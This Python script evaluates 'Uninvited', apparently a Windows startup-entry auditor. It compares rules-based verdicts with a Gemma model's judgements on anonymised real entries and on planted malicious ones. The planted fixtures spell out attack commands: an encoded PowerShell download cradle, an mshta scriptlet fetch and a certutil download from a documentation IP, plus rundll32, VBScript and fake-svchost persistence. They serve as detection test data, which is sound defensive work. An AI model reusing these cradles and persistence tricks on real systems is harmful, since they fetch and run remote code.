"""Evaluate Uninvited on the author's real startup entries plus planted ghosts.

    python eval/run_eval.py --export          # refresh eval/real_entries.json from your last scan (anonymised)
    python eval/run_eval.py                   # run the evaluation, writes eval/EVAL.md and eval/results.json

Three ways of judging each entry are compared:
  * Task Manager view  - no AI, what Windows shows you (file description / entry name)
  * Gemma decides      - ask the model directly: keep / optional / remove / investigate (raw facts only)
  * Uninvited          - rules decide, Gemma only explains and names a category
"""

from __future__ import annotations

import argparse
import base64
import copy
import json
import statistics
import sys
import time
from collections import Counter
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))

from uninvited import ai, report as rpt, rules  # noqa: E402

REAL = HERE / "real_entries.json"
LABELS = HERE / "labels.json"
PLANTED = HERE / "planted.json"
FIELDS = ["id", "kind", "scope", "location", "name", "display_name", "description", "author", "command", "exe",
          "args", "target", "enabled", "state", "trigger", "wake_to_run", "run_as", "pid"]
FILE_FIELDS = ["exists", "sigStatus", "sigType", "isOsBinary", "signer", "company", "description", "product", "version"]
ANON = {"name", "display_name", "location", "command", "exe", "args", "target", "run_as", "author", "description"}


def export_real() -> None:
    report = rpt.load()
    if not report:
        raise SystemExit("No scan found. Run: python -m uninvited scan")
    out = []
    for e in report["entries"]:
        if e.get("is_windows"):
            continue
        x = {k: (ai.anonymize(e.get(k)) if k in ANON and isinstance(e.get(k), str) else e.get(k)) for k in FIELDS}
        x["file"] = {k: (e.get("file") or {}).get(k) for k in FILE_FIELDS}
        x["running"] = {"mb": e["running"]["mb"]} if e.get("running") else None
        out.append(x)
    REAL.write_text(json.dumps(out, indent=1, ensure_ascii=False), encoding="utf-8")
    print(f"Wrote {len(out)} anonymised entries to {REAL}")


# ------------------------------------------------------------------ planted ghosts
def planted() -> list[dict]:
    cradle = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a.ps1')"
    enc = base64.b64encode(cradle.encode("utf-16-le")).decode()
    ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    os_signed = {"exists": True, "sigStatus": "Valid", "sigType": "Catalog", "isOsBinary": True,
                 "signer": "CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US",
                 "company": "Microsoft Corporation"}
    unsigned = {"exists": True, "sigStatus": "NotSigned", "sigType": "None", "isOsBinary": False}
    missing = {"exists": False}

    def signed(org: str, desc: str) -> dict:
        return {"exists": True, "sigStatus": "Valid", "sigType": "Authenticode", "isOsBinary": False,
                "signer": f'CN="{org}", O="{org}", C=US', "company": org, "description": desc, "product": desc}

    rows = [
        ("P01", "OneDriveUpdate", "run", f"{ps} -NoProfile -WindowStyle Hidden -EncodedCommand {enc}", ps,
         {**os_signed, "description": "Windows PowerShell"}, "investigate", None, "T1547.001 Run key + T1027 encoded download cradle"),
        ("P02", "Windows Host Process", "run", r'"%USERPROFILE%\AppData\Local\Temp\svchost.exe"',
         r"%USERPROFILE%\AppData\Local\Temp\svchost.exe", {**unsigned, "description": "Host Process for Windows Services"},
         "investigate", None, "T1036.005 svchost.exe look-alike in Temp"),
        ("P03", "WindowsUpdateCheck", "task", r'"C:\ProgramData\WinUpdate\wuauclt.exe" /detectnow',
         r"C:\ProgramData\WinUpdate\wuauclt.exe", {**unsigned, "description": "Windows Update"}, "investigate", None,
         "T1053.005 task hidden among Windows tasks"),
        ("P04", "SystemSync", "run", 'C:\\Windows\\System32\\mshta.exe "javascript:a=GetObject(\'script:https://203.0.113.7/x.sct\').Exec();close();"',
         r"C:\Windows\System32\mshta.exe", {**os_signed, "description": "Microsoft (R) HTML Application host"}, "investigate", None,
         "T1218.005 mshta inline script"),
        ("P05", "AudioHelper", "run", r'C:\Windows\System32\rundll32.exe "C:\Users\Public\Libraries\audiohlp.dll",DllMain',
         r"C:\Users\Public\Libraries\audiohlp.dll", unsigned, "investigate", None, "T1218.011 rundll32 + DLL in a public folder"),
        ("P06", "Printer Driver Helper", "startup", r'C:\Windows\System32\wscript.exe //B "%APPDATA%\PrinterHelper\update.vbs"',
         r"%APPDATA%\PrinterHelper\update.vbs", unsigned, "investigate", None, "T1547.001 Startup folder + T1059.005 VBScript"),
        ("P07", "SvcHostHelper", "service", r"C:\Windows\Temp\svchelper.exe -k netsvcs", r"C:\Windows\Temp\svchelper.exe",
         unsigned, "investigate", None, "T1543.003 service running from Windows\\Temp"),
        ("P08", "CertSync", "task", r"C:\Windows\System32\certutil.exe -urlcache -split -f http://203.0.113.7/p.exe %TEMP%\p.exe",
         r"C:\Windows\System32\certutil.exe", {**os_signed, "description": "CertUtil.exe"}, "investigate", None, "T1105 certutil download"),
        ("P09", "OldVPN Tray", "run", r'"C:\Program Files (x86)\OldVPN\vpntray.exe" /tray', r"C:\Program Files (x86)\OldVPN\vpntray.exe",
         missing, "lay_to_rest", None, "leftover of an uninstalled VPN"),
        ("P10", "GameLauncherUpdate", "task", r'"%LOCALAPPDATA%\GameLauncher\updater.exe" --check',
         r"%LOCALAPPDATA%\GameLauncher\updater.exe", missing, "lay_to_rest", None, "leftover of an uninstalled game launcher"),
        ("P11", "Spotify", "run", r'"%APPDATA%\Spotify\Spotify.exe" --autostart --minimized', r"%APPDATA%\Spotify\Spotify.exe",
         signed("Spotify AB", "Spotify"), "optional", "media", "benign: signed app in a user folder"),
        ("P12", "Steam", "run", r'"C:\Program Files (x86)\Steam\steam.exe" -silent', r"C:\Program Files (x86)\Steam\steam.exe",
         signed("Valve Corp.", "Steam"), "optional", "game-launcher", "benign"),
        ("P13", "Adobe Acrobat Update Task", "task", r'"C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\AdobeARM.exe"',
         r"C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\AdobeARM.exe", signed("Adobe Inc.", "Adobe Reader and Acrobat Manager"),
         "keep", "updater", "benign updater"),
        ("P14", "com.squirrel.Teams.Teams", "run", r'"%LOCALAPPDATA%\Microsoft\Teams\Update.exe" --processStart "Teams.exe"',
         r"%LOCALAPPDATA%\Microsoft\Teams\Update.exe", signed("Microsoft Corporation", "Microsoft Teams"), "optional", "chat-social",
         "benign: chat app via Squirrel updater"),
    ]
    trig = {"run": "every time you sign in", "task": "when you sign in", "service": "when Windows starts",
            "startup": "every time you sign in"}
    loc = {"run": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "task": "\\", "service": "Services",
           "startup": r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"}
    out = []
    for pid, name, kind, command, target, file, verdict, category, why in rows:
        location = "\\Microsoft\\Windows\\WindowsUpdate\\" if pid == "P03" else loc[kind]
        exe = command.split('"')[1] if command.startswith('"') else command.split(" ")[0]
        out.append({
            "entry": {"id": pid, "kind": kind, "scope": "user", "location": location, "name": name, "display_name": name,
                      "description": "", "command": command, "exe": exe, "args": "", "target": target, "enabled": True,
                      "state": "Ready", "trigger": trig[kind], "wake_to_run": False, "running": None, "file": file},
            "expected": verdict, "category": category, "why": why,
        })
    PLANTED.write_text(json.dumps(out, indent=1), encoding="utf-8")
    return out


# ------------------------------------------------------------------ helpers
def mentions(text: str, aliases: list[str]) -> bool:
    low = (text or "").lower()
    return any(a in low for a in aliases)


def pct(n: int, d: int) -> str:
    return f"{n}/{d} ({100 * n / d:.0f}%)" if d else "0/0"


def run(models: list[str], baseline_model: str) -> dict:
    real = json.loads(REAL.read_text(encoding="utf-8"))
    labels = {k: v for k, v in json.loads(LABELS.read_text(encoding="utf-8")).items() if not k.startswith("_")}
    plants = planted()
    results: dict = {"models": {}, "taskmanager": {}, "planted_rules": [], "counts": {}}

    # No-AI baseline: what Task Manager / services.msc show you.
    tm = []
    for e in real:
        lab = labels.get(e["display_name"])
        if not lab:
            continue
        shown = f"{(e.get('file') or {}).get('description') or ''} {e['display_name']}"
        tm.append({"name": e["display_name"], "identified": mentions(shown, lab["aliases"]), "shown": shown.strip()})
    results["taskmanager"] = {"identified": sum(x["identified"] for x in tm), "total": len(tm), "rows": tm}

    # Rules alone on planted ghosts (no model involved for the bad ones).
    for p in plants:
        e = rules.analyze(copy.deepcopy(p["entry"]))
        verdict, reason = rules.decide(e, None)
        results["planted_rules"].append({"id": p["entry"]["id"], "name": p["entry"]["name"], "expected": p["expected"],
                                         "verdict": verdict, "reason": reason, "flags": [f["id"] for f in e["flags"]],
                                         "why": p["why"]})

    for model in models:
        client = ai.Ollama(model)
        if model not in client.models():
            print(f"skip {model}: not installed")
            continue
        rows, fresh_secs = [], []
        print(f"\n== {model}: explaining {len(real)} real + {len(plants)} planted entries")
        for i, e in enumerate(real + [p["entry"] for p in plants], 1):
            x = rules.analyze(copy.deepcopy(e))
            is_plant = x["id"].startswith("P")
            lab = None if is_plant else labels.get(x["display_name"])
            plant = next((p for p in plants if p["entry"]["id"] == x["id"]), None)
            started = time.time()
            ex = ai.explain(x, client)
            took = time.time() - started
            if took > 0.5:
                fresh_secs.append(ex["stats"]["seconds"])
            verdict, _ = rules.decide(x, ex)
            row = {"name": x["display_name"], "planted": is_plant, "product": ex.get("product"), "vendor": ex.get("vendor"),
                   "category": ex.get("category"), "confidence": ex.get("confidence"), "what": ex.get("what_it_does"),
                   "notes": ex.get("notes"), "uninvited": verdict}
            if lab:
                row.update(label_verdict=lab["verdict"], label_category=lab["category"], ambiguous=bool(lab.get("ambiguous")),
                           identified=mentions(f"{ex.get('product')} {ex.get('vendor')}", lab["aliases"]), note=lab.get("note"))
            if plant:
                row.update(label_verdict=plant["expected"], label_category=plant["category"], ambiguous=False, why=plant["why"])
            judge_it = model == baseline_model and x.get("enabled", True) and (row.get("label_verdict") != "dormant")
            if judge_it:
                direct, _ = ai.direct_verdict(x, client)
                row["gemma_decides"] = direct.get("verdict")
                row["gemma_reason"] = direct.get("reason")
            rows.append(row)
            print(f"  [{i:>2}] {row['uninvited']:<11} {row.get('gemma_decides', ''):<11} {x['display_name'][:44]:<44} {ex.get('category')}", flush=True)
        results["models"][model] = {"rows": rows, "median_seconds": round(statistics.median(fresh_secs), 1) if fresh_secs else None,
                                    "fresh_calls": len(fresh_secs)}
    return results


# ------------------------------------------------------------------ report
def summarize(results: dict) -> str:
    lines = ["# Evaluation", "",
             "Generated by `python eval/run_eval.py`. Real entries come from the author's laptop (anonymised in "
             "`real_entries.json`), labels in `labels.json`, planted ghosts in `planted.json` "
             "(modelled on MITRE ATT&CK persistence techniques; the IP is a documentation address).", ""]
    tm = results["taskmanager"]
    lines += ["## What is it? (identification, real entries)", "",
              "Naming is not the hard part: Windows' own names already contain the product. Deciding is.", "",
              "| Method | Correctly names the product |", "|---|---|",
              f"| Task Manager view (no AI: file description + entry name) | {pct(tm['identified'], tm['total'])} |"]
    for model, data in results["models"].items():
        real_rows = [r for r in data["rows"] if not r["planted"] and "identified" in r]
        lines.append(f"| Uninvited with {model} | {pct(sum(r['identified'] for r in real_rows), len(real_rows))} |")
    lines.append("")

    lines += ["## Should I keep it? (verdicts on the same entries)", "",
              "Real entries that are switched on, excluding judgement calls (the labels file marks them). "
              "\"Gemma decides\" gets the raw facts and must answer keep / optional / remove / investigate.", "",
              "| Method | Correct | Abstained (\"look it up\") | Harmful: told to remove/investigate something you need |", "|---|---|---|---|"]
    for model, data in results["models"].items():
        rows = [r for r in data["rows"] if not r["planted"] and "label_verdict" in r and not r["ambiguous"]
                and r["label_verdict"] != "dormant"]
        ok = sum(r["uninvited"] == r["label_verdict"] for r in rows)
        abst = sum(r["uninvited"] == "unknown" for r in rows)
        harm = sum(r["uninvited"] in ("investigate", "lay_to_rest") for r in rows)
        judged = [r for r in rows if "gemma_decides" in r]
        if judged:
            ok2 = sum(r["gemma_decides"] == r["label_verdict"] for r in judged)
            harm2 = sum(r["gemma_decides"] in ("remove", "investigate") and r["label_verdict"] == "keep" for r in judged)
            lines.append(f"| {model} decides on its own | {pct(ok2, len(judged))} | 0 | {harm2} |")
        lines.append(f"| Uninvited: rules decide, {model} explains | {pct(ok, len(rows))} | {abst} | {harm} |")
    dormant = [r for r in next(iter(results["models"].values()))["rows"]
               if not r["planted"] and r.get("label_verdict") == "dormant"]
    lines += ["", f"The {len(dormant)} entries you had already switched off in Task Manager are reported as \"sleeping\" "
              f"by the rules ({sum(r['uninvited'] == 'dormant' for r in dormant)}/{len(dormant)}).", ""]

    lines += ["## Planted ghosts", "", "| # | Ghost | Technique | Expected | Rules say | Flags |", "|---|---|---|---|---|---|"]
    for p in results["planted_rules"]:
        lines.append(f"| {p['id']} | {p['name']} | {p['why']} | {p['expected']} | {p['verdict']} | {', '.join(p['flags']) or '-'} |")
    lines.append("")
    for model, data in results["models"].items():
        prow = [r for r in data["rows"] if r["planted"]]
        bad = [r for r in prow if r["label_verdict"] in ("investigate", "lay_to_rest")]
        good = [r for r in prow if r["label_verdict"] not in ("investigate", "lay_to_rest")]
        caught = sum(r["uninvited"] == r["label_verdict"] for r in bad)
        false_alarm = sum(r["uninvited"] == "investigate" for r in good)
        good_ok = sum(r["uninvited"] == r["label_verdict"] for r in good)
        lines.append(f"- **Uninvited with {model}:** caught {pct(caught, len(bad))} planted ghosts; "
                     f"benign look-alikes judged right {pct(good_ok, len(good))}; false alarms {false_alarm}.")
        judged = [r for r in prow if "gemma_decides" in r]
        if judged:
            jb = [r for r in judged if r["label_verdict"] in ("investigate", "lay_to_rest")]
            jg = [r for r in judged if r not in jb]
            caught2 = sum(r["gemma_decides"] in ("investigate", "remove") for r in jb)
            fa2 = sum(r["gemma_decides"] in ("investigate", "remove") for r in jg)
            lines.append(f"- **{model} deciding alone:** flagged {pct(caught2, len(jb))} planted ghosts; "
                         f"false alarms on benign look-alikes {fa2}/{len(jg)}.")
    lines.append("")

    lines += ["## Guards that fired", ""]
    for model, data in results["models"].items():
        notes = Counter(n.split(":")[0] for r in data["rows"] for n in (r.get("notes") or []))
        lines.append(f"- {model}: " + (", ".join(f"{k} x{v}" for k, v in notes.items()) or "none") +
                     f". Median time per fresh explanation: {data['median_seconds']} s over {data['fresh_calls']} calls.")
    lines.append("")

    lines += ["## Where Uninvited is wrong (real entries)", "", "| Entry | Label | Uninvited | Gemma said it is | Note |", "|---|---|---|---|---|"]
    for model, data in results["models"].items():
        for r in data["rows"]:
            if r["planted"] or "label_verdict" not in r:
                continue
            if r["uninvited"] != r["label_verdict"]:
                tag = " (judgement call)" if r["ambiguous"] else ""
                lines.append(f"| {r['name'][:46]} | {r['label_verdict']}{tag} | {r['uninvited']} ({model}) | "
                             f"{r['category']}: {r['product']} | {r.get('note') or ''} |")
    lines.append("")
    base = next(iter(results["models"].values()), None)
    if base:
        lines += ["## Gemma deciding alone: the misses", "", "| Entry | Label | Gemma said | Its reason |", "|---|---|---|---|"]
        for r in base["rows"]:
            if "gemma_decides" in r and r["gemma_decides"] != r["label_verdict"]:
                lines.append(f"| {r['name'][:46]} | {r['label_verdict']} | {r['gemma_decides']} | {(r.get('gemma_reason') or '')[:110]} |")
    return "\n".join(lines) + "\n"


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--export", action="store_true")
    p.add_argument("--models", default="gemma4:e4b-it-qat,gemma4:e2b")
    p.add_argument("--baseline-model", default="gemma4:e4b-it-qat")
    p.add_argument("--from-results", action="store_true", help="only rebuild EVAL.md from results.json")
    args = p.parse_args()
    if args.export:
        export_real()
        return 0
    if args.from_results:
        results = json.loads((HERE / "results.json").read_text(encoding="utf-8"))
        (HERE / "EVAL.md").write_text(summarize(results), encoding="utf-8")
        print(f"Rebuilt {HERE / 'EVAL.md'}")
        return 0
    results = run([m.strip() for m in args.models.split(",") if m.strip()], args.baseline_model)
    (HERE / "results.json").write_text(json.dumps(results, indent=1, default=str), encoding="utf-8")
    (HERE / "EVAL.md").write_text(summarize(results), encoding="utf-8")
    print(f"\nWrote {HERE / 'EVAL.md'}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
